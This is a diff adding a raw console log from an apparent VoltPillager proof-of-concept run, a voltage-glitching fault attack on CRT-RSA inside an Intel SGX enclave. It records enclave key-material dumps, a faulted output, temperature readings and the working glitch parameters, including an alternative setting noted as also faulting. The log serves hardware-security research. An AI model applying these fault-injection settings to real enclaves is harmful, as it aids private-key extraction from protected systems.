@@ -1,0 +1,250 @@
+tryagain@tryagain-bagger:~/voltpillager/poc/sgx_crt_rsa$ sudo ./app 1000
+[main.c] Creating enclave...
+[pt.c] /dev/sgx-step opened!
+Teensy serial: opened port /dev/ttyACM0
+send: delay 10
+~send: 1 0.9400 35 0.7500 -50 1.0500
+resp: delay
+Delay Set!
+1 0.9400 35 0.7500 -50 1.0500
+resp:(1 times) 0.940V -> delay 35 -> 0.750V -> delay 9 -> 1.050V
+Armed!
+[main.c] init RSA...
+Enclave: Init P...
+Enclave: DW: eecfae81
+Enclave: DW: b1b9b3c9
+Enclave: DW: 08810b10
+Enclave: DW: a1b56001
+Enclave: DW: 99eb9f44
+Enclave: DW: aef4fda4
+Enclave: DW: 93b81a9e
+Enclave: DW: 3d84f632
+Enclave: DW: 124ef023
+Enclave: DW: 6e5d1e3b
+Enclave: DW: 7e28fae7
+Enclave: DW: aa040a2d
+Enclave: DW: 5b252176
+Enclave: DW: 459d1f39
+Enclave: DW: 7541ba2a
+Enclave: DW: 58fb6599
+Enclave: create_BN_state() = 0x7f9df426c060
+Enclave: Init Q...Enclave: DW: c97fb1f0
+Enclave: DW: 27f453f6
+Enclave: DW: 341233ea
+Enclave: DW: aad1d935
+Enclave: DW: 3f6c42d0
+Enclave: DW: 8866b1d0
+Enclave: DW: 5a0f2035
+Enclave: DW: 028b9d86
+Enclave: DW: 9840b416
+Enclave: DW: 66b42e92
+Enclave: DW: ea0da3b4
+Enclave: DW: 3204b5cf
+Enclave: DW: ce335252
+Enclave: DW: 4d0416a5
+Enclave: DW: a441e700
+Enclave: DW: af461503
+Enclave: create_BN_state() = 0x7f9df426c130
+Enclave: DW: 54494ca6
+Enclave: DW: 3eba0337
+Enclave: DW: e4e24023
+Enclave: DW: fcd69a5a
+Enclave: DW: eb07dddc
+Enclave: DW: 0183a4d0
+Enclave: DW: ac9b54b0
+Enclave: DW: 51f2b13e
+Enclave: DW: d9490975
+Enclave: DW: eab77414
+Enclave: DW: ff59c1f7
+Enclave: DW: 692e9a2e
+Enclave: DW: 202b38fc
+Enclave: DW: 910a4741
+Enclave: DW: 74adc93c
+Enclave: DW: 1f67c981
+Enclave: create_BN_state() = 0x7f9df426c200
+Enclave: DW: 471e0290
+Enclave: DW: ff0af075
+Enclave: DW: 0351b7f8
+Enclave: DW: 78864ca9
+Enclave: DW: 61adbd3a
+Enclave: DW: 8a7e991c
+Enclave: DW: 5c0556a9
+Enclave: DW: 4c3146a7
+Enclave: DW: f9803f8f
+Enclave: DW: 6f8ae342
+Enclave: DW: e931fd8a
+Enclave: DW: e47a220d
+Enclave: DW: 1b99a495
+Enclave: DW: 849807fe
+Enclave: DW: 39f9245a
+Enclave: DW: 9836da3d
+Enclave: create_BN_state() = 0x7f9df426c2d0
+Enclave: DW: b06c4fda
+Enclave: DW: bb630119
+Enclave: DW: 8d265bdb
+Enclave: DW: ae9423b3
+Enclave: DW: 80f271f7
+Enclave: DW: 34538850
+Enclave: DW: 93077fcd
+Enclave: DW: 39e2119f
+Enclave: DW: c9863215
+Enclave: DW: 4f5883b1
+Enclave: DW: 67a967bf
+Enclave: DW: 402b4e9e
+Enclave: DW: 2e0f9656
+Enclave: DW: e698ea36
+Enclave: DW: 66edfb25
+Enclave: DW: 798039f7
+Enclave: create_BN_state() = 0x7f9df426c3a0
+Enclave: DW: bbf82f09
+Enclave: DW: 0682ce9c
+Enclave: DW: 2338ac2b
+Enclave: DW: 9da871f7
+Enclave: DW: 368d07ee
+Enclave: DW: d41043a4
+Enclave: DW: 40d6b6f0
+Enclave: DW: 7454f51f
+Enclave: DW: b8dfbaaf
+Enclave: DW: 035c02ab
+Enclave: DW: 61ea48ce
+Enclave: DW: eb6fcd48
+Enclave: DW: 76ed520d
+Enclave: DW: 60e1ec46
+Enclave: DW: 19719d8a
+Enclave: DW: 5b8b807f
+Enclave: DW: afb8e0a3
+Enclave: DW: dfc73772
+Enclave: DW: 3ee6b4b7
+Enclave: DW: d93a2584
+Enclave: DW: ee6a649d
+Enclave: DW: 06095374
+Enclave: DW: 8834b245
+Enclave: DW: 4598394e
+Enclave: DW: e0aab12d
+Enclave: DW: 7b61a51f
+Enclave: DW: 527a9a41
+Enclave: DW: f6c1687f
+Enclave: DW: e2537298
+Enclave: DW: ca2a8f59
+Enclave: DW: 46f8e5fd
+Enclave: DW: 091dbdcb
+Enclave: create_BN_state() = 0x7f9df426c500
+Enclave: DW: a5dafc53
+Enclave: DW: 41faf289
+Enclave: DW: c4b988db
+Enclave: DW: 30c1cdf8
+Enclave: DW: 3f31251e
+Enclave: DW: 0668b427
+Enclave: DW: 84813801
+Enclave: DW: 579641b2
+Enclave: DW: 9410b3c7
+Enclave: DW: 998d6bc4
+Enclave: DW: 65745e5c
+Enclave: DW: 392669d6
+Enclave: DW: 870da2c0
+Enclave: DW: 82a939e3
+Enclave: DW: 7fdcb82e
+Enclave: DW: c93edac9
+Enclave: DW: 7ff3ad59
+Enclave: DW: 50accfbc
+Enclave: DW: 111c76f1
+Enclave: DW: a9529444
+Enclave: DW: e56aaf68
+Enclave: DW: c56c092c
+Enclave: DW: d38dc3be
+Enclave: DW: f5d20a93
+Enclave: DW: 9926ed4f
+Enclave: DW: 74a13edd
+Enclave: DW: fbe1a1ce
+Enclave: DW: cc4894af
+Enclave: DW: 9428c2b7
+Enclave: DW: b8883fe4
+Enclave: DW: 463a4bc8
+Enclave: DW: 5b1cb3c1
+Enclave: create_BN_state() = 0x7f9df426c650
+Enclave: DW: 00000011
+Enclave: create_BN_state() = 0x7f9df426c470
+Enclave: DW: 00eb7a19
+Enclave: DW: ace9e300
+Enclave: DW: 6350e329
+Enclave: DW: 504b45e2
+Enclave: DW: ca82310b
+Enclave: DW: 26dcd87d
+Enclave: DW: 5c68f1ee
+Enclave: DW: a8f55267
+Enclave: DW: c31b2e8b
+Enclave: DW: b4251f84
+Enclave: DW: d7e0b2c0
+Enclave: DW: 4626f5af
+Enclave: DW: f93edcfb
+Enclave: DW: 25c9c2b3
+Enclave: DW: ff8ae10e
+Enclave: DW: 839a2ddb
+Enclave: DW: 4cdcfe4f
+Enclave: DW: f47728b4
+Enclave: DW: a1b7c136
+Enclave: DW: 2baad29a
+Enclave: DW: b48d2869
+Enclave: DW: d5024121
+Enclave: DW: 43581159
+Enclave: DW: 1be392f9
+Enclave: DW: 82fb3e87
+Enclave: DW: d095aeb4
+Enclave: DW: 0448db97
+Enclave: DW: 2f3ac14f
+Enclave: DW: 7bc27519
+Enclave: DW: 5281ce32
+Enclave: DW: d2f1b76d
+Enclave: DW: 4d353e2d
+Enclave: create_BN_state() = 0x7f9df426c830
+Enclave: DW: 1253e04d
+Enclave: DW: c0a5397b
+Enclave: DW: b44a7ab8
+Enclave: DW: 7e9bf2a0
+Enclave: DW: 39a33d1e
+Enclave: DW: 996fc82a
+Enclave: DW: 94ccd300
+Enclave: DW: 74c95df7
+Enclave: DW: 63722017
+Enclave: DW: 069e5268
+Enclave: DW: da5d1c0b
+Enclave: DW: 4f872cf6
+Enclave: DW: 53c11df8
+Enclave: DW: 2314a679
+Enclave: DW: 68dfeae2
+Enclave: DW: 8def04bb
+Enclave: DW: 6d84b1c3
+Enclave: DW: 1d654a19
+Enclave: DW: 70e5783b
+Enclave: DW: d6eb96a0
+Enclave: DW: 24c2ca2f
+Enclave: DW: 4a90fe9f
+Enclave: DW: 2ef5c9c1
+Enclave: DW: 40e5bb48
+Enclave: DW: da9536ad
+Enclave: DW: 8700c84f
+Enclave: DW: c9130ade
+Enclave: DW: a74e558d
+Enclave: DW: 51a74ddf
+Enclave: DW: 85d8b50d
+Enclave: DW: e96838d6
+Enclave: DW: 063e0955
+Enclave: create_BN_state() = 0x7f9df426c980
+Result = 1
+0x6e, 0x35, 0xea, 0x8c, 0xac, 0xe4, 0xe8, 0x1d, 0xc0, 0x3f, 0x52, 0xe7, 0xf8, 0x27, 0x21, 0xd1, 0x75, 0x86, 0x1e, 0x30, 0xe7, 0xe6, 0x90, 0x07, 0x5a, 0xc6, 0xed, 0x97, 0x21, 0x59, 0xad, 0x4d, 0x61, 0x64, 0x43, 0x5f, 0x70, 0x78, 0xbc, 0x78, 0x1a, 0x82, 0x1e, 0x0d, 0x8f, 0xd3, 0x6d, 0x27, 0x78, 0x28, 0x72, 0x6f, 0xf9, 0x63, 0x6e, 0x8e, 0x92, 0x98, 0x40, 0x96, 0x2e, 0xde, 0x28, 0x0a, 0x14, 0x1d, 0xc0, 0xc3, 0x27, 0xf3, 0x44, 0xa8, 0x8d, 0xf5, 0xb5, 0xe5, 0x1c, 0x96, 0xed, 0xe4, 0xf6, 0x11, 0xa4, 0xa6, 0x26, 0x7f, 0xf1, 0x82, 0xaf, 0x33, 0x85, 0x24, 0xc5, 0x3d, 0x67, 0x2a, 0x55, 0x69, 0xd9, 0xc3, 0x9b, 0xcb, 0x25, 0xfc, 0xa4, 0x9a, 0x2a, 0x5d, 0x6e, 0xa6, 0x92, 0x97, 0xf0, 0x14, 0x3f, 0x8e, 0x91, 0x33, 0x65, 0xa1, 0x61, 0x0f, 0x75, 0xbf, 0xc1, 0x08, 0xec, 0x61, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+Noooo!!!!1111elfoelf
+[main.c] Exiting...
+tryagain@tryagain-bagger:~/voltpillager/poc/sgx_crt_rsa$ sensors
+coretemp-isa-0000
+Adapter: ISA adapter
+Package id 0:  +22.0°C  (high = +100.0°C, crit = +100.0°C)
+Core 0:        +22.0°C  (high = +100.0°C, crit = +100.0°C)
+Core 1:        +21.0°C  (high = +100.0°C, crit = +100.0°C)
+
+tryagain@tryagain-bagger:~/voltpillager/poc/sgx_crt_rsa$
+
+
+configuration: 	configure_glitch_with_delay(1, 0.94, 35, 0.75, -50, 1.05, 10);
+freq: 2Ghz
+
+configure_glitch_with_delay(1,1.05, 35, 0.75, -50, 1.05, 10); can fault it too
